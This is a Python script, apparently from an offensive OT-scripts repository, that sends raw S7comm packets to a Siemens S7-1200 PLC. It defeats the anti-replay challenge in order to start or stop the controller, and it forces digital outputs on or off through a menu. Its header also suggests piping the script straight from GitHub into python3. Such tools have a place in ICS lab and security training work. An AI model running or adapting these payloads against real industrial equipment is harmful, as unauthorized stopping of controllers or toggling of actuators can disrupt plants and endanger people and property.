#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para interactuar con un PLC Siemens S7-1200, versión 1214c
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/PLC-Siemens-S7-1200-1214c-Interactuar.py | python3 -
#
# Bajar y editar directamente el archivo en nano:
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/PLC-Siemens-S7-1200-1214c-Interactuar.py | nano -
# ----------

import curses
import time
import socket
import argparse


def fConectar(vHost):
  print(f"\n  Conectando a {vHost} en el puerto 102... \n")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(10)
  try:
    s.connect((vHost, 102))
    print("\n  Conexión establecida. \n")
    return s
  except socket.error as e:
    print(f"\n  Error al conectar con el PLC: {e} \n")
    return None


def fEnviarPayload(payload, con):
  print(f"\n  Enviando: {payload} \n")
  con.send(bytearray.fromhex(payload))
  try:
    data = con.recv(1024)
    if data:
      print(f"\n  Respuesta cruda del PLC: {data.hex()} \n")
    else:
      print("\n  No se recibió respuesta del PLC. \n")
    return data
  except socket.timeout:
    print("\n  Error: El PLC no respondió en el tiempo esperado. \n")
    return None


def fEncenderPLC(vHost):
  s = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP =     '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
  vSolCommS7 =       '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'

  fEnviarPayload(vSolCommCOTP, s)
  data = fEnviarPayload(vSolCommS7, s)
  if not data:
    s.close()
    return
  challenge = data.hex()[48:50]
  anti = int(challenge, 16) + int("80", 16)
  vPayloadEncender = vPayloadEncender[:46] + hex(anti)[2] + vPayloadEncender[47:]
  vPayloadEncender = vPayloadEncender[:47] + hex(anti)[3] + vPayloadEncender[48:]
  fEnviarPayload(vPayloadEncender, s)
  print("\n  PLC iniciado correctamente \n.")
  s.close()


def fApagarPLC(vHost):
  s = fConectar(vHost)
  if not s:
    return
  vSolCommCOTP =   '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
  vSolCommS7 =     '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'

  fEnviarPayload(vSolCommCOTP, s)
  data = fEnviarPayload(vSolCommS7, s)
  if not data:
    s.close()
    return
  challenge = data.hex()[48:50]
  anti = int(challenge, 16) + int("80", 16)
  vPayloadApagar = vPayloadApagar[:46] + hex(anti)[2] + vPayloadApagar[47:]
  vPayloadApagar = vPayloadApagar[:47] + hex(anti)[3] + vPayloadApagar[48:]
  fEnviarPayload(vPayloadApagar, s)
  print("\n  PLC detenido correctamente. \n")
  s.close()


def fEncenderSalida(vHost, salida, nombre):
  s = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP = '0300001611e00000cfc400c0010ac1020100c2020101'
  vSolCommS7 =   '0300001902f08032010000000000080000f0000008000803c0'
  cSalidas = {
    'Q0.0':  '0300002502f08032010000001f000e00060501120a10010001000082000000000300010100',
    'Q0.1':  '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100',
    'Q0.2':  '0300002502f08032010000001f000e00060501120a10010001000082000002000300010100',
    'Q0.3':  '0300002502f08032010000001f000e00060501120a10010001000082000003000300010100',
    'Q0.4':  '0300002502f08032010000001f000e00060501120a10010001000082000004000300010100',
    'Q0.5':  '0300002502f08032010000001f000e00060501120a10010001000082000005000300010100',
    'Q0.6':  '0300002502f08032010000001f000e00060501120a10010001000082000006000300010100',
    'Q0.7':  '0300002502f08032010000001f000e00060501120a10010001000082000007000300010100',
    'Q0.8':  '0300002502f08032010000001f000e00060501120a10010001000082000008000300010100',
    'Q0.9':  '0300002502f08032010000001f000e00060501120a10010001000082000009000300010100',
    'Q0.10': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100'
  }

  if salida not in cSalidas:
    print(f"\n  Salida {nombre} no definida. \n")
    s.close()
    return

  for cmd in [vSolCommCOTP, vSolCommS7, cSalidas[salida]]:
    fEnviarPayload(cmd, s)

  print(f"\n  Salida {nombre} activada correctamente. \n")
  s.close()


def fApagarSalida(vHost, salida, nombre):
  s = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP = '0300001611e00000cfc400c0010ac1020100c2020101'
  vSolCommS7 = '0300001902f08032010000000000080000f0000008000803c0'
  comandos = {
    'Q0.0':  '0300002502f08032010000001f000e00060501120a10010001000082000000000300010000',
    'Q0.1':  '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000',
    'Q0.2':  '0300002502f08032010000001f000e00060501120a10010001000082000002000300010000',
    'Q0.3':  '0300002502f08032010000001f000e00060501120a10010001000082000003000300010000',
    'Q0.4':  '0300002502f08032010000001f000e00060501120a10010001000082000004000300010000',
    'Q0.5':  '0300002502f08032010000001f000e00060501120a10010001000082000005000300010000',
    'Q0.6':  '0300002502f08032010000001f000e00060501120a10010001000082000006000300010000',
    'Q0.7':  '0300002502f08032010000001f000e00060501120a10010001000082000007000300010000',
    'Q0.8':  '0300002502f08032010000001f000e00060501120a10010001000082000008000300010000',
    'Q0.9':  '0300002502f08032010000001f000e00060501120a10010001000082000009000300010000',
    'Q0.10': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000'
  }

  if salida not in comandos:
    print(f"\n  Salida {nombre} no definida. \n")
    s.close()
    return

  for cmd in [vSolCommCOTP, vSolCommS7, comandos[salida]]:
    fEnviarPayload(cmd, s)

  print(f"\n  Salida {nombre} desactivada correctamente. \n")
  s.close()


def fMenu(stdscr, vHost):
  # Ocultamos el cursor y configuramos el par de colores para resaltar la opción seleccionada
  curses.curs_set(0)
  stdscr.keypad(True)  # Activa el modo keypad para que se reconozcan las teclas especiales
  curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)

  menu = [
    "Encender PLC",
    "  Apagar PLC",
    "Encender salida 0",
    "  Apagar salida 0",
    "Encender salida 1",
    "  Apagar salida 1",
    "Encender salida 2",
    "  Apagar salida 2",
    "Encender salida 3",
    "  Apagar salida 3",
    "Encender salida 4",
    "  Apagar salida 4",
    "Encender salida 5",
    "  Apagar salida 5",
    "Encender salida 6",
    "  Apagar salida 6",
    "Encender salida 7",
    "  Apagar salida 7",
    "Encender salida 8",
    "  Apagar salida 8",
    "Encender salida 9",
    "  Apagar salida 9",
    "Salir"
  ]
  current_row = 0

  while True:
    stdscr.clear()
    height, width = stdscr.getmaxyx()

    # Mostramos el menú centrado en la pantalla
    for idx, row in enumerate(menu):
      x = width // 2 - len(row) // 2
      y = height // 2 - len(menu) // 2 + idx
      if idx == current_row:
        stdscr.attron(curses.color_pair(1))
        stdscr.addstr(y, x, row)
        stdscr.attroff(curses.color_pair(1))
      else:
        stdscr.addstr(y, x, row)
    stdscr.refresh()

    key = stdscr.getch()

    if key == curses.KEY_UP and current_row > 0:
      current_row -= 1
    elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
      current_row += 1
    elif key in [curses.KEY_ENTER, 10, 13]:
      if menu[current_row] == "Salir":
        break
      elif menu[current_row] == "Encender PLC":
        fEncenderPLC(vHost)
      elif menu[current_row] == "  Apagar PLC":
        fApagarPLC(vHost)
      elif menu[current_row] == "Encender salida 0":
        fEncenderSalida(vHost, 'Q0.0', 'Salida 0')
      elif menu[current_row] == "  Apagar salida 0":
        fApagarSalida(vHost, 'Q0.0', 'Salida 0')
      elif menu[current_row] == "Encender salida 1":
        fEncenderSalida(vHost, 'Q0.1', 'Salida 1')
      elif menu[current_row] == "  Apagar salida 1":
        fApagarSalida(vHost, 'Q0.1', 'Salida 1')
      elif menu[current_row] == "Encender salida 2":
        fEncenderSalida(vHost, 'Q0.2', 'Salida 2')
      elif menu[current_row] == "  Apagar salida 2":
        fApagarSalida(vHost, 'Q0.2', 'Salida 2')
      elif menu[current_row] == "Encender salida 3":
        fEncenderSalida(vHost, 'Q0.3', 'Salida 3')
      elif menu[current_row] == "  Apagar salida 3":
        fApagarSalida(vHost, 'Q0.3', 'Salida 3')
      elif menu[current_row] == "Encender salida 4":
        fEncenderSalida(vHost, 'Q0.4', 'Salida 4')
      elif menu[current_row] == "  Apagar salida 4":
        fApagarSalida(vHost, 'Q0.4', 'Salida 4')
      elif menu[current_row] == "Encender salida 5":
        fEncenderSalida(vHost, 'Q0.5', 'Salida 5')
      elif menu[current_row] == "  Apagar salida 5":
        fApagarSalida(vHost, 'Q0.5', 'Salida 5')
      elif menu[current_row] == "Encender salida 6":
        fEncenderSalida(vHost, 'Q0.6', 'Salida 6')
      elif menu[current_row] == "  Apagar salida 6":
        fApagarSalida(vHost, 'Q0.6', 'Salida 6')
      elif menu[current_row] == "Encender salida 7":
        fEncenderSalida(vHost, 'Q0.7', 'Salida 7')
      elif menu[current_row] == "  Apagar salida 7":
        fApagarSalida(vHost, 'Q0.7', 'Salida 7')
      elif menu[current_row] == "Encender salida 8":
        fEncenderSalida(vHost, 'Q0.8', 'Salida 8')
      elif menu[current_row] == "  Apagar salida 8":
        fApagarSalida(vHost, 'Q0.8', 'Salida 8')
      elif menu[current_row] == "Encender salida 9":
        fEncenderSalida(vHost, 'Q0.9', 'Salida 9')
      elif menu[current_row] == "  Apagar salida 9":
        fApagarSalida(vHost, 'Q0.9', 'Salida 9')

  stdscr.clear()
  stdscr.addstr(0, 0, "Saliendo del programa...")
  stdscr.refresh()

if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='Control de PLC Siemens S7-1200')
  parser.add_argument('--host', required=True, help='\n Dirección IP del PLC \n')
  args = parser.parse_args()
  vHost = args.host
  curses.wrapper(lambda stdscr: fMenu(stdscr, vHost))

